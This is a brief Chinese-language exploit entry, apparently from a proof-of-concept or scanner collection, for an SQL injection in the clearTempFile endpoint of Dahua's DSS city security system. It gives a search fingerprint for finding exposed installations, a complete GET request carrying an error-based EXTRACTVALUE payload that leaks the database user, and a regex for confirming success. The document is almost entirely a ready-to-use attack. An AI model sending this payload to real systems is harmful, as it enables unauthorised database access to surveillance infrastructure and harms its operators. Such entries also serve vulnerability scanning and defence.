# 大华DSS城市安防系统clearTempFileSQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`body="/portal/include/script/dahuaDefined/headCommon.js?type=index"`
- **请求**：`GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1`
- **响应特征**：200 ^(?=.*?XPATH)(?=.*?sql).*?$